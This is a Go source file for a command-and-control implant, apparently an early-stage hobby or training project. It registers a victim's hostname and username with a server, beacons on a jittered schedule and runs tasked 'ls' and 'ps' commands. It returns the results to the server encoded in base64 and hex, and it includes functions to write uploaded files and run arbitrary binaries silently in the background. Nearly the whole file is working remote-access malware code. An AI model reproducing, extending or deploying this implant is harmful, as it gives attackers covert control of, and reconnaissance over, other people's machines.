package main

import (
	"bytes"
	crand "crypto/rand"
	"encoding/hex"
	"encoding/json"
        "encoding/base64"
	"fmt"
	mathrand "math/rand"
	"net/http"
	"os"
	"io"
	"os/user"
	"os/exec"
	"time"
	"net"
	"strconv"
	"strings"
)

var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano())) 

type CallbackInfo struct {
	Callback_freq int
	Jitter        int
	SelfTerminate int
}

type InitialInfo struct {
	Session      string `json:"session"`
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	Callback_freq int    `json:"callback_freq"`
	Jitter       int    `json:"jitter"`
}

type ResultsCreate struct {
    TaskingID float64 `json:"tasking_id"`
    Session   string  `json:"session"`
    Task      string  `json:"task"`
    Args    string     `json:"args"`
    Results   string  `json:"results"`
}


func GatherInfo() InitialInfo {
	bytes := make([]byte, 4)
	_, err := crand.Read(bytes)  
	if err != nil {
		panic(err)
	}
	hexString := hex.EncodeToString(bytes)
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	hostInfo := InitialInfo{
		Session:      hexString,
		Hostname:     hostname,
		Username:     currentUser.Username,
		Callback_freq: 1,
		Jitter:       15,
	}
	return hostInfo
}

func encodeToBaseHexArray(input []string) []string {
        encodedOutput := make([]string, len(input))
        for i, str := range input {
                encodedBase64 := base64.StdEncoding.EncodeToString([]byte(str))
                encodedHex := hex.EncodeToString([]byte(encodedBase64))
                encodedOutput[i] = encodedHex
        }
        return encodedOutput
}

func encodeToBaseHexString(input string) string {
        encodedBase64 := base64.StdEncoding.EncodeToString([]byte(input))
        encodedHex := hex.EncodeToString([]byte(encodedBase64))
        return encodedHex
}

func ParseTasks(serverUrl string, tasking string) (string, error) {
        
	var tasks []map[string]interface{}
	err := json.Unmarshal([]byte(tasking), &tasks)
	if err != nil {
		return "", err
	}
        fmt.Println(tasks)
        

	for _, taskData := range tasks {
                url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
		fmt.Printf("Task ID: %v\n", taskData["id"])
		fmt.Printf("Task: %v\n", taskData["task"])
		fmt.Printf("Args: %v\n", taskData["args"])
                if taskData["task"] == "ls" {
                        dir, err := listDirectories(taskData["args"].(string))
                        if err != nil {
                                fmt.Println("Error listing directories:", err)
                                continue
                        }
                                                
                        encodedOutput := encodeToBaseHexString(dir)
                        encodedArgs := encodeToBaseHexString(taskData["args"].(string))
                        fmt.Println("Encoded args:", encodedArgs)
                        fmt.Println("Encoded output:", encodedOutput)
                        fmt.Println(taskData["id"].(float64))
                        result := ResultsCreate{
                                TaskingID: taskData["id"].(float64),
                                Session:   taskData["session"].(string),
                                Task:      taskData["task"].(string),
                                Args:      encodedArgs,
                                Results:   encodedOutput,
                        }
                        _, err = PostJson(url, result)
                        if err != nil {
                                fmt.Println("Error posting task result:", err)
                        }

                } else if taskData["task"] == "ps" {                
                        processList, err := get_ps()
                        if err != nil {
                                fmt.Println("Error getting process list:", err)
                                continue
                        }
                        encodedOutput := encodeToBaseHexString(processList)
                        result := ResultsCreate{
                                TaskingID: taskData["id"].(float64),
                                Session:   taskData["session"].(string),
                                Task:      taskData["task"].(string),
                                Args:      "",
                                Results:   encodedOutput,
                        }
                        _, err = PostJson(url, result)
                        if err != nil {
                                fmt.Println("Error posting task result:", err)
                        }
                        
                }

	}
	return "", nil
}

func FetchTasking(serverAddr string, session string) (string, error) {
        url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)

        resp, err := http.Get(url)
        if err != nil {
                return "", err
        }
        defer resp.Body.Close()
        bodyBytes, err := io.ReadAll(resp.Body)
        if err != nil {
                return "", err
        }
        bodyString := string(bodyBytes)
        fmt.Println(bodyString)
        return bodyString, nil
}

func CheckIn(serverAddr string, session string) (int, error) {
	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
        // Prevent auto redirects so if there is tasking 301 is actually returned and 
        // we can fetch tasking, otherwise the main function will just return 200
        // and we will never get the tasking
        client := &http.Client{
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                        return http.ErrUseLastResponse
                },
        }

	resp, err := client.Get(url)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
        fmt.Println("Check-in response:", resp.StatusCode)
	return resp.StatusCode, nil
}

func TerminateImplant() {
	// Get the name of your implant
	// Get the pwd the implant if running from 
	// Check to see if it is on disk, if so remove, if not then just kill yourself
	os.Exit(0)
}

func PostJson(url string, payload interface{}) (int, error) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

        body, _ := io.ReadAll(resp.Body)
        fmt.Println("Response body:", string(body))

	return resp.StatusCode, nil
}

func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
	randomPercent := rng.Intn(jitterPercent + 1)
	jitterFraction := float64(randomPercent) / 100.0

	baseSeconds := baseMinutes * 60
	jitterSeconds := int(float64(baseSeconds) * jitterFraction)

	totalSeconds := baseSeconds + jitterSeconds

	jitterDuration := time.Duration(totalSeconds) * time.Second

	fmt.Printf("Random jitter: %d%% (+%ds) → total %s\n", randomPercent, jitterSeconds, jitterDuration)
	return jitterDuration
}

func get_proc_listing() []string {
        dir, err := os.Open("/proc")
        if err != nil {
                return nil
        }
        defer dir.Close()

        files, err := dir.Readdir(-1)
        if err != nil {
                return nil
        }
        var filenames []string
        for _, file := range files {
                filenames = append(filenames, file.Name())
        }
        return filenames

}

func read_proc_file(file_name string) string {
        data, err := os.ReadFile(file_name)
        if err != nil {
                return ""
        }
        content := strings.ReplaceAll(string(data), "\x00", " ") // replace \x00 with space
        return content
}

func get_ps() (string, error) {
    proc_files := get_proc_listing()
    process_list := ""

    for _, name := range proc_files {
        pid, err := strconv.Atoi(name)
        if err != nil {
            continue
        }

        cmdline_path := fmt.Sprintf("/proc/%d/cmdline", pid)
        ppid_path := fmt.Sprintf("/proc/%d/status", pid)

        var cmdline_file_contents string
        if len(read_proc_file(cmdline_path)) != 0 {
            cmdline_file_contents = read_proc_file(cmdline_path)
        } else {
            // Fallback to reading name from /proc/[pid]/status
            status_contents := read_proc_file(ppid_path)
            cmdline_file_lines := strings.Split(status_contents, "\n")

            for _, line := range cmdline_file_lines {
                if strings.HasPrefix(line, "Name:") {
                    parts := strings.Fields(line)
                    if len(parts) == 2 {
                        cmdline_file_contents = fmt.Sprintf("[%s]", parts[1])
                    } else {
                        cmdline_file_contents = "?"
                    }
                    break
                }
            }
        }

        ppid_file_contents := read_proc_file(ppid_path)
        ppid_lines := strings.Split(ppid_file_contents, "\n")

        var ppid_value string
        for _, line := range ppid_lines {
            if strings.HasPrefix(line, "PPid:") {
                parts := strings.Fields(line)
                if len(parts) == 2 {
                    ppid_value = parts[1]
                } else {
                    ppid_value = "?"
                }
                break
            }
        }

        process_list += fmt.Sprintf("%-7d  %-7s  %s\n", pid, ppid_value, cmdline_file_contents)
    }
    return process_list, nil
}


//func marshalOutput(taskId int, task string, output []string)
        // add completed and add datetime of completion
        //outputData := json.Marshal("") 

func listDirectories(directory string) (string, error){
        fileList := ""
        dir, err := os.Open(directory)
        if err != nil {
                return "", err
        }
        defer dir.Close()

        files, err := dir.Readdir(-1)
        if err != nil {
                return "", err
        }
        for _, file := range files {
                line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
                fileList += line
        }
        return fileList, nil
}

func uploadFile(conn net.Conn, remotePath string, fSize string) {
        fileSize, err := strconv.ParseInt(fSize, 10, 64)
        if err != nil {
                fmt.Fprintf(conn, "[!] Invalid file size\n__END__\n")
                return
        }

        file, err := os.OpenFile(remotePath, os.O_CREATE|os.O_WRONLY, 0777)
        if err != nil {
                fmt.Fprintf(conn, "[!] Error creating file at: %v\n__END__\n", err)
                return
        }
        defer file.Close()

        _, err = conn.Write([]byte{'1'})
        if err != nil {
                return
        }

        buffer := make([]byte, 4096)
        totalBytes := int64(0)

        for totalBytes < fileSize {
                n, err := conn.Read(buffer)
                if n > 0 {
                        _, write_err := file.Write(buffer[:n])
                        if write_err != nil {
                                fmt.Fprintf(conn, "[!] Error writing to file: %v\n__END__\n", write_err)
                                return
                        }
                        totalBytes += int64(n)
                }

                if err != nil {
                        fmt.Fprintf(conn, "[!] Error reading from connection: %v\n__END__\n", err)
                        return
                }
        }

        if totalBytes == fileSize {
                fmt.Fprintf(conn, "[+] Success writing data to: %v\n__END__\n", remotePath)

        } else {
                fmt.Fprintf(conn, "[!] File size mismatch: expected %d bytes, recieved %d bytes\n__END__\n", fileSize, totalBytes)
        }
}

func execBinary(conn net.Conn, binPath string, args []string, background bool) {
        binary := exec.Command(binPath, args...)

        var output bytes.Buffer

        if background {
                binary.Stdin = nil
                binary.Stdout, _ = os.Open(os.DevNull)
                binary.Stderr, _ = os.Open(os.DevNull)
        } else {
                binary.Stdin = nil
                binary.Stdout = &output
                binary.Stderr = &output
        }

        err := binary.Start()
        if err != nil {
                fmt.Fprintf(conn, "%v\n__END__\n", err)
                return
        }

        if background {
                fmt.Fprintf(conn, "%s", "[+] Binary executed successfully in background\n__END__\n")
                return
        }

        err = binary.Wait()
        if err != nil {
                fmt.Fprintf(conn, "%v\n__END__\n", err)
                return
        }

        fmt.Fprintf(conn, "%v", output.String())
        fmt.Fprintf(conn, "%s", "__END__\n")

}


func main() {
	fmt.Println("Agent started")

	retryCounter := 0
	serverUrl := "http://127.0.0.1:8000"

	initialInfo := GatherInfo()

	callbackTimer := CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}

	// register with server 
	resp, err := PostJson(serverUrl+"/implants/", initialInfo)
	if err != nil {
		panic(err)
	}
	if resp != 200 {
		fmt.Printf("Response: %v\n", resp)
	}

	for {
		nextInterval := RandomJitter(callbackTimer.Callback_freq, callbackTimer.Jitter)
		timer := time.NewTimer(nextInterval)
		fmt.Printf("Next check-in in %s\n", nextInterval)

		<-timer.C
		resp, err := CheckIn(serverUrl, initialInfo.Session)
                if err != nil{
                        fmt.Printf("Error checking in: %v\n", err)
                        retryCounter += 1
                        if retryCounter >= callbackTimer.SelfTerminate {
                                TerminateImplant()
                        }
                        continue
                }
                if resp != 200 && resp != 301 {
                        fmt.Printf("Unexpected response: %v\n", resp)
                        retryCounter += 1
                        if retryCounter >= callbackTimer.SelfTerminate {
                                TerminateImplant()
                        }
                        continue
                }
                if resp == 301 {
                        // we have tasking
                        tasking, err := FetchTasking(serverUrl, initialInfo.Session)
                        if err != nil {
                                fmt.Printf("Error fetching tasking: %v\n", err)
                        } else {
                                ParseTasks(serverUrl, tasking)
                        }
                        continue
                }
		fmt.Println("Check-in fired")
                retryCounter = 0
		timer.Stop()
	}
}
